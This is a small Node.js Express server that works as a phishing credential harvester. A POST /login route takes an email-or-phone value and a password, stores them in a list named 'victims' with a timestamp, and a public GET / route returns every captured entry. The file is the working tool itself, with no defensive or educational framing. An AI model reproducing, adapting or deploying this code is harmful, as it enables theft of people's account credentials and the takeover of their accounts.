const express = require("express");
var cors = require('cors')

const app = express();
app.use(express.json());
app.use(cors())

const database = {victims:[]};

app.get("/", (req, res) => {
    res.send(database)
})

app.post("/login", (req,res) => {
    const {emailOrphone, password} = req.body;
    database.victims.push({
        emailOrphone:emailOrphone, 
        password:password,
        time: new Date().toLocaleString([], { timeZone: "Asia/Dhaka" })
    })
    res.json("success");
})

app.listen(4000, () => {
    console.log("app is listening to port 4000")
})

